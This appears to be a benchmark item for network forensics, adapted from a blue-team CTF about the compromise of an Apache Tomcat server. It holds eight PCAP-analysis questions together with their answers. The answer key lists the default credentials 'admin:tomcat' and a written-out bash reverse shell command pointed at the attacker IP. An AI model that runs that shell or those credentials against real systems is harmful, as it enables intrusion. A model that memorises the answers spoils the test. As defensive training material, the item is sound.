@@ -1,0 +1,90 @@
+{
+  "scenarios": [
+    {
+      "metadata": {
+        "source": "https://cyberdefenders.org/blueteam-ctf-challenges/tomcat-takeover/",
+        "scenario_name": "Tomcat",
+        "last_accessed": "June 04, 2025",
+        "writeup": "https://github.com/Panagiotis-INS/Cyber-Defenders/tree/main/Tomcat%20Takeover"
+      }
+    },
+    {
+      "sia_components": {
+        "scenario": "Suspicious behavior was detected by the SOC team on a web server operating inside the company’s intranet. To investigate further, they collected network traffic for detailed examination. The captured PCAP file could hold clues pointing to malicious actions that resulted in the compromise of the Apache Tomcat server. Your objective is to analyze the PCAP data and determine the extent of the attack.",
+        "task_category": "Network Forensics",
+        "complexity": "Easy",
+        "tools_available": [
+          "tshark",
+          "grep",
+          "awk",
+          "sed",
+          "find",
+          "strings",
+          "file",
+          "cut",
+          "uniq",
+          "wc",
+          "cat",
+          "ls",
+          "sort",
+          "echo",
+          "head",
+          "tail",
+          "tr",
+          "base64",
+          "find",
+          "cd",
+          "md5sum",
+          "python",
+          "whois",
+          "curl"
+        ],
+        "files_available": "capture.pcap",
+        "directory": "(directory_of_the_files)",
+        "instructions": "You are solving this problem in a kali linux terminal. You can use any tool as you want.If you need to install any other tool, you can do it by adding sudo at the beginning of the command. (Add instructions related to usage of python scripts, if needed)",
+        "questions": [
+          {
+            "question": "1. Using the network traffic, can you identify if there is any source IP address exhibiting scanning behavior. If so, what is the IP address?",
+            "answer": "14.0.0.120",
+            "adversarial_tactic": "Reconnaissance : This activity involves identifying the source of the scanning or enumeration behavior in the captured network traffic."
+          },
+          {
+            "question": "2. Based on the identified IP address associated with the attacker, can you ascertain the city from which the attacker's activities originated?",
+            "answer": "Guangzhou",
+            "adversarial_tactic": "Reconnaissance: IP attribution helps in understanding the attack source from which the reconnaissance activities are originating."
+          },
+          {
+            "question": "3. Can you identify if there were any ports detected as open on the target server during the attack? If so, which of the ports provide access to the web server admin panel?",
+            "answer": "8080",
+            "adversarial_tactic": "Reconnaissance: Identifying open ports helps attackers find potential entry points."
+          },
+          {
+            "question": "4. Can you identify if the attacker attempted to enumerate directories and files on the web server? If so, which tool/tools were used for this purpose?",
+            "answer": "Gobuster",
+            "adversarial_tactic": "Discovery: Enumeration helps attackers map server structure."
+          },
+          {
+            "question": "5. Subsequent to directory enumeration, can you identify if the attacker attempt to identify administrative interfaces? If so, which directory was the attacker was able to uncover?",
+            "answer": "/manager",
+            "adversarial_tactic": "Discovery: Enumeration helps attackers map server structure."
+          },
+          {
+            "question": "6. Subsequent to accessing the administrative interface, can you identify if the attacker attempt to authenticate to the web server? If so, what credentials were used?",
+            "answer": "admin:tomcat",
+            "adversarial_tactic": "Initial Access: Default or weak credentials can provide initial access to systems."
+          },
+          {
+            "question": "7. Following successful authentication, can you identify if the attacker uploaded any files to the web server? If so, what was the name of the uploaded file?",
+            "answer": "JXQOZY.war",
+            "adversarial_tactic": "Execution: File uploads can deliver malicious payloads to the server."
+          },
+          {
+            "question": "8. Can you identify if the attacker attempted to establish persistence on the compromised server? If so, what persistence mechanisms were employed?",
+            "answer": "/bin/bash -c bash -i >& /dev/tcp/14.0.0.120/443 0>&1",
+            "adversarial_tactic": "Persistence: Attackers use persistence mechanisms to maintain access to compromised systems."
+          }
+        ]
+      }
+    }
+  ]
+}
